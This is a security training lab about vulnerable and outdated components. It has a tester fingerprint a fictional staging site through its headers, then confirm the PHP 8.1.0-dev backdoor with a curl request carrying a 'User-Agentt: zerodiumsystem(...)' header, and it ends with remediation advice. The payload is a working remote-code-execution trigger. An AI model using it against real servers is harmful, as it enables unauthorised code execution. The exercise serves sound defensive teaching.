# IDENTIFY AND PREVENT VULNERABLE AND OUTDATED COMPONENTS
---------------------------------------------------------

* Introduction
--------------
The following example will explore how serious Vulnerable and Outdated Components can be to our application.

When developing a secure application, we must consider our choices when writing our code. We need to be careful regarding what functions we use, how we implement code logic, and how we 
allow users to interact with the application.

But even if our code is written perfectly, there are still areas an attacker could take advantage of. For example, what happens if a library we decided to use has a vulnerability within 
it? Despite our best efforts, code written by another developer, designed to help abstract out complexity and improve our development time, may negatively impact system security.

When we develop and implement our applications, we must be aware of all components that interact with our code. This includes the server software feeding requests to our code, any 
intermediary proxies, the language and versions we use, the code libraries we import, and more.

Failure to properly review, assess, and vet these many components may take your secure code and introduce serious vulnerabilities to the application.

In the following exercises, we’ll explore an example of how serious vulnerable and outdated components can be, how to test for some of them, and how to report on the findings properly.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------

* Assessing Vulnerable and Outdated Components
----------------------------------------------
As an internal penetration tester for Acme Org, you perform security assessments and recommend ways to better secure company systems and applications. Given Acme’s dedication to security, 
you are also part of their software development life cycle!

Recently, you’ve been tasked with performing an assessment on a static website that is still in development. This site will act as a landing page for a new service Acme Org will be 
offering. Despite the lack of dynamic content, internal development policies require you to review the application. While it is in staging, the software stack will be identical in 
production, assuming you have no security recommendations.

The site is currently hosted at staging-dev.acmeco.org.

* Instructions
--------------
To begin, let’s run a basic CURL command to retrieve the HTTP headers. As we can see on OWASP’s site, certain HTTP Headers may provide valuable information. Let’s run the following 
command:

	curl -verbose http://staging-dev.acmeco.org/welcome.php

With the -verbose argument, we can retrieve the HTTP body and the headers.

With the headers in hand, let’s compare the returned headers with those provided by OWASP. Two headers, in particular, should stand out. In our case, the “Server” and “X-Powered-By” 
headers provide software versions.

If we start with the Server header, we can see it runs Apache version 2.4.55. A quick google search of this finds it to be the latest version of Apache, and while some vulnerabilities may 
impact this version, they are low in severity.

Moving to the X-Powered-By header, the system runs PHP version 8.1.0-dev. Another quick google search of this finds something interesting. On March 28, 2021, a backdoor was uncovered 
within this PHP version! If our system runs this version, that is a potentially serious issue!

In the next exercise, let’s exploit this finding and validate the issue again using CURL.

* Output
--------

Terminal

$ curl -verbose http://staging-dev.acmeco.org/welcome.php
*   Trying 10.100.80.90:80...
* Connected to staging-dev.acmeco.org (10.100.80.90) port 80 (#0)
> GET /welcome.php HTTP/1.1
> Host: staging-dev.acmeco.org
> User-Agent: curl/7.82.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Server: Apache/2.4.55
< X-Powered-By: PHP/8.1.0-dev
< Date: Mon, 20 Feb 2023 15:36:37 GMT
< Content-Type: text/html
< Content-Length: 161
< Connection: keep-alive
< Location: https://staging-dev.acmeco.org/welcome.php
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>Acme</center>
</body>
</html>
* Connection #0 to host staging-dev.acmeco.org left intact

------------------------------------------------------------------------------------------------------------------------------------------------------------------

* Exploiting and Remediating Vulnerable and Outdated Components
---------------------------------------------------------------
Let’s validate the PHP version we observed. While the returned version number does have known issues, we need to ensure the system we’re testing is vulnerable and not returning a wrong 
version.

If we research this version of PHP, we should be able to identify several write up about php/8.1-backdoor and php-8.1.0-dev-backdoor-rce.

Reading through these vulnerabilities, we see that the backdoor is triggered by a special HTTP header called User-Agentt. The value associated with this header is ultimately passed to an 
eval statement, capable of executing arbitrary code.

* Instructions 
--------------
To validate this finding, we’ll use CURL once again. This time, however, we’ll also include the --headers argument to add the malicious header.

Run the following command.

	curl -verbose http://staging-dev.acmeco.org/ --header "User-Agentt: zerodiumsystem('id')"

If we look at the response body, we’ll see the output of the id command. This means the system is vulnerable and susceptible to remote code execution!

Now that we’ve validated the finding let’s discuss potential fixes.

When addressing Vulnerable and Outdated Components, several approaches can help to mitigate and reduce the risk associated with problematic components.

The first and usual solution is to update the problematic component to a secure, non-vulnerable version. In our case, this is likely the only solution we can effectively implement. Because 
the backdoor is built directly into the version of PHP, we cannot leverage this version of PHP without exposing the vulnerability.

In some cases, we may be able to avoid updating components and instead avoid using vulnerable functions. For example, many sites use JQuery, and given the code size and the number of 
open-source developers contributing to the code, vulnerabilities have crept in.

While various issues impact certain versions of JQuery, many of these vulnerabilities are tied to specific JQuery functions. If we avoid these functions, we can avoid making our code 
vulnerable.

Of course, leaving vulnerable components may create issues down the road, though software requirements may change, and developers may unintentionally implement dangerous portions of these 
components.

In the case of Acme Org’s site, we would likely recommend that the development team update their version of PHP to a secure version.

* output
--------

Terminal

$ curl -verbose http://staging-dev.acmeco.org/ --header "User-Agentt: zerodiumsystem('id')"
*   Trying 10.100.80.90:80...
* Connected to staging-dev.acmeco.org (10.100.80.90) port 80 (#0)
> GET / HTTP/1.1
> Host: staging-dev.acmeco.org
> User-Agent: curl/7.82.0
> User-Agentt: zerodiumsystem('id')
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: Apache/2.4.55
< X-Powered-By: PHP/8.1.0-dev
< Date: Mon, 20 Feb 2023 15:36:37 GMT
< Content-Type: text/html
< 
<!DOCTYPE html>
uid=1000(staging) gid=1000(staging) groups=1000(staging)
* Connection #0 to host staging-dev.acmeco.org left intact

------------------------------------------------------------------------------------------------------------------------------------------------------------------

* Conclusion
------------
In the previous exercises, we explored how vulnerable components can severely impact our applications, even when working with something as simple as a static site.

To ensure our application is as secure as possible, we need to review all components of our applications carefully. As we saw in our example, certain software components may be exposed 
directly to users by the system. However, other areas may be hidden away and abstracted.

Developers should ensure that when using third-party libraries and applications, they properly vet and review those libraries for known issues and embedded libraries within them. No 
example has better highlighted the potential issues of ignoring embedded libraries than the recent Log4J issue.

While many developers properly reviewed the libraries they used, some failed to perform deeper reviews. Because of this, development teams across the world inadvertently introduced 
serious vulnerabilities within their applications that they had no real visibility into.

Before using any libraries or components, it’s important that teams perform a deep dive into their desired tools to ensure they aren’t introducing any unwanted risk into their systems. 
Certain sites like sonatype may help developers identify these dependencies.

------------------------------------------------------------------------------------------------------------------------------------------------------------------


